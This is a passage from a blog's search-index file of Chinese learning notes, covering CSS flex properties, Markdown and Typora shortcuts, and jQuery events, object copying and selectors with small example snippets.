</code></p></li><li><p><code>flex</code>：<code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code>的简写，默认值为<code>0 1 auto</code>。后两个属性可选</p></li><li><p><code>align-self</code>：允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性</p><p><code>auto | flex-start | flex-end | center | baseline | stretch</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown语法/typora使用及其快捷键</title>
      <link href="/learningNotes/typora%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE"/>
      <url>/learningNotes/typora%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE</url>
      
        <content type="html"><![CDATA[<p>超详细：<a href="https://blog.csdn.net/SIMBA1949/article/details/79001226">https://blog.csdn.net/SIMBA1949/article/details/79001226</a></p><h5 id="标题">标题<a title="#标题" href="#标题"></a></h5><p>’#‘ 一阶标题 ctrl+1</p><p>‘##’ 二阶标题  ctrl+2</p><p>…</p><p>‘######’ 六阶标题 ctrl+6</p><h5 id="文本居中">文本居中<a title="#文本居中" href="#文本居中"></a></h5><p>'&lt;center&gt;这是要居中的文本&lt;center&gt;’</p><center>居中</center><center>这是要居中的文本</center><h5 id="下划线">下划线<a title="#下划线" href="#下划线"></a></h5><p><u>或者ctrl+u</u></p><h5 id="删除线">删除线<a title="#删除线" href="#删除线"></a></h5><p><s>或者alt+shift+5</s></p><h5 id="字体加粗">字体加粗<a title="#字体加粗" href="#字体加粗"></a></h5><p><strong>或者ctrl+B 或者一对__ l</strong></p><h5 id="字体倾斜">字体倾斜<a title="#字体倾斜" href="#字体倾斜"></a></h5><p><em>或者ctrl+i 或者 一对_ l</em></p><h5 id="字体倾斜加粗">字体倾斜加粗<a title="#字体倾斜加粗" href="#字体倾斜加粗"></a></h5><p><em><strong>或者用一对___ l</strong></em></p><h5 id="图片插入">图片插入<a title="#图片插入" href="#图片插入"></a></h5><p>可直接拉入</p><p>或者<img src="" alt="" loading="lazy"></p><h5 id="超链接">超链接<a title="#超链接" href="#超链接"></a></h5><p><a href="http://www.simba.com" target="_blank">http://www.simba.com</a>  //&lt;直接输入&gt;</p><p><a href="www.baidu.com">百度百科</a> //快捷健 ctrl+k  or /[自定义内容 /]/(超链接地址)</p><ul><li><p>打开本地文件时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[打开linkTest.md文档](./linkTest.md)</span><br></pre></td></tr></table></figure></li><li><p>页内跳转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[链接文字](#标题文字)</span><br></pre></td></tr></table></figure><p>[标题](# 标题)</p></li></ul><h5 id="代码行">代码行<a title="#代码行" href="#代码行"></a></h5><p>一对`包住</p><p><code>printf(&quot;hello&quot;)</code></p><h5 id="代码段">代码段<a title="#代码段" href="#代码段"></a></h5><p>三个`+enter /空格 +编程语言</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="表格使用">表格使用<a title="#表格使用" href="#表格使用"></a></h5><p>ctrl+t 会自动跳出设置行和列的设置框</p><p>使用 <code>|</code> 来分隔不同的单元格，使用 <code>-</code> 来分隔表头和其他行</p><p>or |国际|省市|市区|</p><div class="φbq"><div class="φbs"><table><thead><tr><th style="text-align:left">国际</th><th>省市</th><th>市区</th></tr></thead><tbody><tr><td style="text-align:left"></td><td></td><td></td></tr></tbody></table></div></div><h5 id="任务列表">任务列表<a title="#任务列表" href="#任务列表"></a></h5><p>-/+/*无序列表</p><ul><li></li></ul><ul><li></li></ul><ul><li>java</li></ul><p>-[] 多选框（注意用空格隔开）</p><ul class="φbr"><li><input type="checkbox" disabled=""><i></i>java</li></ul><p>任意数字+.+空格 有序列表</p><ol><li></li></ol><h5 id="数学表达式">数学表达式<a title="#数学表达式" href="#数学表达式"></a></h5><p>行内：由一个美元符号将公式包起来  $cosx+sinx=1$</p><p>行外：ctrl+shift+m<br>$$<br>cosx+sinx=1<br>$$</p><h5 id="上标下标">上标下标<a title="#上标下标" href="#上标下标"></a></h5><p>可以使用^,_后跟相应符号实现</p><p>$a^1$  $a_1$  $a^{32}$</p><h5 id="根号">根号<a title="#根号" href="#根号"></a></h5><p>可以用\sqrt{}  \sqrt[]{}</p><p>$\sqrt{5}$  $\sqrt[4]{10}$</p><h5 id="上下水平线">上下水平线<a title="#上下水平线" href="#上下水平线"></a></h5><p>\underline{} \overline</p><p>$\underline{a+1}$ $\overline{a+1}$</p><h4 id="更多数学公式在：https://blog.csdn.net/simba1949/article/details/79001226">更多数学公式在：<a href="https://blog.csdn.net/SIMBA1949/article/details/79001226">https://blog.csdn.net/SIMBA1949/article/details/79001226</a><a title="#更多数学公式在：https://blog.csdn.net/simba1949/article/details/79001226" href="#更多数学公式在：https://blog.csdn.net/simba1949/article/details/79001226"></a></h4><h5 id="水平分割线">水平分割线<a title="#水平分割线" href="#水平分割线"></a></h5><p>***或 - - -（不行）</p><hr><h5 id="引用">引用<a title="#引用" href="#引用"></a></h5><p>‘&gt;’+空格</p><blockquote><p>引用</p></blockquote><h5 id="注释">注释<a title="#注释" href="#注释"></a></h5><p>[^ 注释内容]</p><h5 id="插入目录">插入目录<a title="#插入目录" href="#插入目录"></a></h5><p>可以在输入[toc]命令的地方自动根据标签生成目录</p><h5 id="导出">导出<a title="#导出" href="#导出"></a></h5><p>选择文件–&gt;导出</p><h5 id="文本高亮">文本高亮<a title="#文本高亮" href="#文本高亮"></a></h5><p>一对==</p><p>==高亮==</p><h5 id="表情">表情<a title="#表情" href="#表情"></a></h5><p>:单词</p><p>:dancer:</p><img src="img\typora.png" style="zoom:65%; float:left;" /><h4 id="typora与html">typora与html<a title="#typora与html" href="#typora与html"></a></h4><h5 id="改变文字颜色">改变文字颜色<a title="#改变文字颜色" href="#改变文字颜色"></a></h5><p>用font标签改变大小及颜色</p><p><font size=2 color="red">字体为red ，大小为2</font></p><h5 id="改变对齐方式">改变对齐方式<a title="#改变对齐方式" href="#改变对齐方式"></a></h5><p align="left">左对齐</p><p align="center">中间对齐</p><p align="right">右对齐</p><h5 id="插入图像">插入图像<a title="#插入图像" href="#插入图像"></a></h5><p>通过<img scr=url /></p><img src="img/typora1.jpg" width=100 height=100 align=left>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03 jQuery事件</title>
      <link href="/learningNotes/jquery/03jQuery%E4%BA%8B%E4%BB%B6"/>
      <url>/learningNotes/jquery/03jQuery%E4%BA%8B%E4%BB%B6</url>
      
        <content type="html"><![CDATA[<h4 id="1.jquery事件注册">1.jQuery事件注册<a title="#1.jquery事件注册" href="#1.jquery事件注册"></a></h4><h5 id="单个注册事件">单个注册事件<a title="#单个注册事件" href="#单个注册事件"></a></h5><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.事件(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;)</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; 事件处理程序 &#125;)</span><br></pre></td></tr></table></figure><p>其他事件跟原生基本一致</p><p>比如：mouseover、mouseout、blur、focus、change、keydown、keyup、resize、scroll等</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//1.单个事件注册</span></span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;purple&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">mouseenter</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;skyblue&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2.jquery事件处理">2.jQuery事件处理<a title="#2.jquery事件处理" href="#2.jquery事件处理"></a></h4><h5 id="2.1事件处理on()绑定事件">2.1事件处理on()绑定事件<a title="#2.1事件处理on()绑定事件" href="#2.1事件处理on()绑定事件"></a></h5><p>on() 方法在匹配元素上绑定一个或多个事件处理函数</p><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">on</span>(events,[selector],fn)</span><br></pre></td></tr></table></figure><ul><li><p>events：一个或多个用空格分隔的事件类型，如“click”或“keydown”</p></li><li><p>selector：元素的子元素选择器</p></li><li><p>fn：回调函数 即绑定在元素身上的监听函数</p><img src="https://s1.328888.xyz/2022/04/09/XkpPi.png" style="zoom:67%;" align="left" /><img src="https://s1.328888.xyz/2022/04/09/XksAv.png" style="zoom:67%;" align="left" /><img src="https://s1.328888.xyz/2022/04/09/Xk7Y0.png" style="zoom:67%;" align="left" /></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.事件处理on</span></span><br><span class="line"><span class="comment">//优势1 on可以绑定1个或多个事件处理程序</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">on</span>(&#123;</span><br><span class="line">    <span class="attr">mouseenter</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;skyblue&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">click</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;purple&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mouseleave</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//优势1 if事件处理程序相同</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;mouseenter mouseleave&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">toggleClass</span>(<span class="string">&quot;current&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//优势2 on可以实现事件委托</span></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>,<span class="string">&quot;li&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">11</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//click 是绑在ul身上的 但是触发的对象是 ul 里面的小li</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//优势3 on可以给未来动态规划创建元素绑定事件</span></span><br><span class="line">$(<span class="string">&quot;ol li&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">11</span>);  <span class="comment">//因为还没有创建 所以没有办法实现</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;ol&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>,<span class="string">&quot;li&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">11</span>); <span class="comment">//可以弹出弹窗</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> li = $(<span class="string">&quot;&lt;li&gt;这是现在才加入的li&lt;li&gt;&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;ol&quot;</span>).<span class="title function_">sppend</span>(li);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2.2事件处理off()解绑事件">2.2事件处理off()解绑事件<a title="#2.2事件处理off()解绑事件" href="#2.2事件处理off()解绑事件"></a></h5><p>off()方法可以移除通过on()方法添加的事件处理程序</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">off</span>() <span class="comment">//解绑p元素的所有事件处理程序</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">off</span>(<span class="string">&quot;click&quot;</span>) <span class="comment">//解绑p元素上面的点击事件 后面的fn是监听函数名</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).<span class="title function_">off</span>(<span class="string">&quot;click&quot;</span>,<span class="string">&quot;li&quot;</span>) <span class="comment">//解绑事件委托</span></span><br></pre></td></tr></table></figure><p><font color="red"> 如果有的事件只想触发一次，可以使用one()来绑定事件</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.事件解绑 off</span></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).<span class="title function_">off</span>(<span class="string">&quot;click&quot;</span>); <span class="comment">//解绑ul元素上面的点击事件</span></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).<span class="title function_">off</span>(<span class="string">&quot;click&quot;</span>,<span class="string">&quot;li&quot;</span>) ;</span><br><span class="line"><span class="comment">//2.one()但是它只能触发事件一次</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">one</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">11</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="2.3自动触发事件trigger()">2.3自动触发事件trigger()<a title="#2.3自动触发事件trigger()" href="#2.3自动触发事件trigger()"></a></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.元素.事件()</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">click</span>(); <span class="comment">//会触发元素的默认行为</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.元素 .trigger(&quot;事件&quot;)</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">trigger</span>(<span class="string">&quot;focus&quot;</span>); <span class="comment">//会触发元素的默认行为</span></span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).<span class="title function_">trigger</span>(<span class="string">&quot;focus&quot;</span>); <span class="comment">//其默认行为 光标闪烁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.元素.triggerHandler(&quot;事件&quot;) 就是不会触发元素默认行为</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">triggerHandler</span>(<span class="string">&quot;click&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;focus&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">val</span>(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="3.jquery事件对象">3.jQuery事件对象<a title="#3.jquery事件对象" href="#3.jquery事件对象"></a></h4><p>事件被触发，就会有事件对象的产生<br><code>element.on(events,[selector],function(event)&#123;&#125;)</code><br>阻止默认行为：<code>event.preventDefault() / return false</code><br>阻止冒泡: <code>event.stopPropagation()</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击了document&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击了div&quot;</span>);</span><br><span class="line">    event.<span class="title function_">stopPropagation</span>();  <span class="comment">//if没有这个代码，则这个div点击后 会冒泡 上面的document也会打印出来</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04 jQuery对象</title>
      <link href="/learningNotes/jquery/04jQuery%E5%AF%B9%E8%B1%A1"/>
      <url>/learningNotes/jquery/04jQuery%E5%AF%B9%E8%B1%A1</url>
      
        <content type="html"><![CDATA[<h4 id="1.jquery对象拷贝">1.jQuery对象拷贝<a title="#1.jquery对象拷贝" href="#1.jquery对象拷贝"></a></h4><p>如果想要把某个对象拷贝（合并）给另一个对象使用，此时可以使用$.extend()方法</p><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">extend</span>([deep]，target,object1,[objectN])</span><br></pre></td></tr></table></figure><ul><li>deep：如果设为true 为深拷贝 ，默认false 浅拷贝</li><li>target：要拷贝的目标对象</li><li>object1：待拷贝到第一个对象的对象</li><li>objectN：待拷贝到第N个对象的对象</li><li>浅拷贝是把被拷贝的对象<font color="red">复杂数据类型中的地址</font>拷贝给目标对象，<u>修改目标对象 会影响被拷贝对象</u></li><li>深拷贝 前面＋true 完全克隆（拷贝的对象，而不是地址），<u>修改目标对象不会影响被拷贝对象</u></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> targetObj=&#123;</span><br><span class="line">        <span class="attr">id</span>:<span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> obj=&#123;</span><br><span class="line">        <span class="attr">id</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;andy&quot;</span>，</span><br><span class="line">        <span class="attr">msg</span>:&#123;    <span class="comment">//!!!</span></span><br><span class="line">        <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    $.<span class="title function_">extend</span>(targetObj,obj);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(targetObj); <span class="comment">//会覆盖targetObj 里面原来的数据</span></span><br><span class="line"><span class="comment">//1.浅拷贝是把被拷贝的对象复杂数据类型中的地址拷贝给目标对象</span></span><br><span class="line">targetObj.<span class="property">msg</span>.<span class="property">age</span>=<span class="number">20</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(targetObj);  <span class="comment">//msg.age=20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj); <span class="comment">//msg.age=20</span></span><br><span class="line"><span class="comment">//2.深拷贝把里面的数据完全复制一份给目标对象 如果里面有不冲突的属性 会合并到一起</span></span><br><span class="line">$.<span class="title function_">extend</span>(<span class="literal">true</span>,targetObj,obj);</span><br><span class="line">targetObj.<span class="property">msg</span>.<span class="property">age</span>=<span class="number">20</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(targetObj);  <span class="comment">//msg.age=20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj); <span class="comment">//msg.age=18</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><img src="https://s1.328888.xyz/2022/04/09/Xkq6O.png" style="zoom:70%;" align="left" /><h4 id="2.多库共存">2.多库共存<a title="#2.多库共存" href="#2.多库共存"></a></h4><img src="https://s1.328888.xyz/2022/04/09/XkzdS.png" style="zoom:60%;" align="left" /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">ele</span>)&#123;   <span class="comment">//把$用在这个函数上</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(ele);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>));</span><br><span class="line">    <span class="comment">//1.如果$符号冲突 我们就用jQuery 代替$</span></span><br><span class="line">    <span class="comment">//$.each(); 这个不能用 因为$.each()不是一个函数 $被占用</span></span><br><span class="line">    jQuery.<span class="title function_">each</span>();</span><br><span class="line">    <span class="comment">//2.让jQuery 释放对$ 的控制权 让用自己命名的东西</span></span><br><span class="line">    <span class="keyword">var</span> suibian=jQuery.<span class="title function_">noConflict</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">suibian</span>(<span class="string">&quot;span&quot;</span>));</span><br><span class="line">    suibian.<span class="title function_">each</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="3.jquery插件">3.jQuery插件<a title="#3.jquery插件" href="#3.jquery插件"></a></h4><img src="https://s1.328888.xyz/2022/04/09/Xktbm.png" style="zoom:70%;" align="left" /><img src="https://s1.328888.xyz/2022/04/09/XkWyA.png" style="zoom:70%;" align="left" />]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02 jQuery常用API</title>
      <link href="/learningNotes/jquery/02jQuery%E5%B8%B8%E7%94%A8API"/>
      <url>/learningNotes/jquery/02jQuery%E5%B8%B8%E7%94%A8API</url>
      
        <content type="html"><![CDATA[<h4 id="1-jquery选择器">1 jQuery选择器<a title="#1-jquery选择器" href="#1-jquery选择器"></a></h4><h5 id="1.1jquery基础选择器">1.1jQuery基础选择器<a title="#1.1jquery基础选择器" href="#1.1jquery基础选择器"></a></h5><img src="https://s1.328888.xyz/2022/04/09/XkYXF.png" style="zoom:80%;" align="left" /><h5 id="1.2层级选择器">1.2层级选择器<a title="#1.2层级选择器" href="#1.2层级选择器"></a></h5><img src="https://s1.328888.xyz/2022/04/09/XkTpW.png" style="zoom:60%;" align="left"  /><h5 id="1.3.1-知识铺垫—jquery设置样式">1.3.1 知识铺垫—jQuery设置样式<a title="#1.3.1-知识铺垫—jquery设置样式" href="#1.3.1-知识铺垫—jquery设置样式"></a></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(<span class="string">&#x27;属性&#x27;</span>,<span class="string">&#x27;值&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.获取四个div文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2.给四个div文件设置背景  jQuery对象不能应style</span></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;pink&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//隐式迭代 就是把所有匹配的所有元素内部进行遍历循环 给每一个元素都添加css这个方法</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="1.3.2-隐式迭代">1.3.2 隐式迭代<a title="#1.3.2-隐式迭代" href="#1.3.2-隐式迭代"></a></h5><p>遍历内部 DOM 元素，以为数组形式存储的过程就叫做 隐式迭代。<br>即：给匹配到的所有元素进行循环遍历，执行相应的方法</p><h5 id="1.4-jquery-筛选选择器">1.4 jQuery 筛选选择器<a title="#1.4-jquery-筛选选择器" href="#1.4-jquery-筛选选择器"></a></h5><img src="https://s1.328888.xyz/2022/04/09/XkcFy.png" style="zoom:55%;" align="left" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 二级导航 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>   <span class="comment">&lt;!-- 一级导航 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span> <span 